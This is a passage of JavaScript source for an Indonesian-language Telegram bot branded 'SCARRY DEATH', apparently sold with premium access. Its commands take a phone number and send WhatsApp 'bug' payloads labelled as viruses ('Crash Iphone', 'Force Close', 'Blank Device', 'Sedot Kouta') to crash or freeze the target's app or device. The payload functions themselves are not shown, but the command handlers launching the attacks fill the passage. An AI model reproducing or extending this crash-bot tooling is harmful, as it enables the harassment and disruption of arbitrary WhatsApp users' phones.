        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /crashhome
⪧ Virus  : Crash Home
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await blankraraa2(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ THUNDERVIS INFINITY ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /crashhome
⪧ Virus  : Crash Home
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   

bot.onText(/\/blankdevice (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }
     
        
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     

  if (blacklistedCommands.includes('/blankdevice')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankdevice
⪧ Virus  : Blank Device
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await blankraraa3(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /blankdevice
⪧ Virus  : Blank Device
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/mentioninvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
  if (blacklistedCommands.includes('/mentioninvis')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /mentioninvis
⪧ Virus  : Mention Invisible
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayraraa2(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /mentioninvis
⪧ Virus  : Mention Invisible
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/drainkouta (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/drainkouta')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /drainkouta
⪧ Virus  : Sedot Kouta
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await delayraraa3(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /drainkouta
⪧ Virus  : Sedot Kouta
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/force (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
            const isPremium = await premium (senderId);
const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

    

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
  if (blacklistedCommands.includes('/force')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /force
⪧ Virus  : Force Close Click
⪧ Status : Proses
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await forceraraa1(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /force
⪧ Virus  : Force Close Click
⪧ Status : Sucses
⪧ Date now : ${date}

©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐`, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/crashios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/crashios')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     
  
       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /crashios
⪧ Virus  : Crash Iphone
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await iosraraa1(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /crashios
⪧ Virus  : Crash Iphone
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/fciphone (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/fciphone')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fciphone
⪧ Virus  : Force Iphone
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await iosraraa2(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fciphone
⪧ Virus  : Force Iphone
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/fcinfinity (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/fcinfinity')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}

   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
     

       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fcinfinity
⪧ Virus  : Forclose Infinity
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await forceraraa2(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /fcinfinity
⪧ Virus  : Forclose Infinity
⪧ Status : Sucses
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐  `, 
      {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `Gagal mengirim bug: ${error.message}`);
  }
});   
bot.onText(/\/forceios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const date = getCurrentDate();
            const targetNumber = match[1];
            const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
            const target = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const chatType = msg.chat.type;
           const isPremium = await premium (senderId);
            const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
            if (isGroupOnly() && chatType === 'private') {
            return bot.sendMessage(chatId, 'Bot ini hanya bisa digunakan di grup.');
            }

  if (blacklistedCommands.includes('/forceios')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH raraa_imuppp" ); 
    }
     
  
       if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
  // Cek premium
if (!isPremium) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ♰</blockquote>
use /addprem before using this command to be able to access 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "DEVELOPER ⵢ", url: "https://t.me/raraa_imuppp" }], 
      ]
    }
  });
}


  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 628xx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }
  
// Kirim pesan awal (status: sedang mengirim)
const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `
<blockquote>♰ 𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 ATTACKING ♰</blockquote>
⪧ Pengirim : ${username}
⪧ Target : ${formattedNumber}
⪧ Comand : /forceios
⪧ Virus  : Apple Forclose
⪧ Status : Proses.. 
⪧ Date now : ${date}

 ©️ 𝐒𝐂𝐀𝐑𝐑𝐘 𝐃𝐄𝐀𝐓𝐇 𝐕𝟏𝟗 𝐆𝐄𝐍 𝟐 
`,
      parse_mode: "HTML"
    });

    // Eksekusi serangan
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    await iosraraa3(target);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan jadi status sukses
    await bot.editMessageCaption(`
<blockquote>♰ THUNDERVIS INFINITY ATTACKING ♰</blockquote>
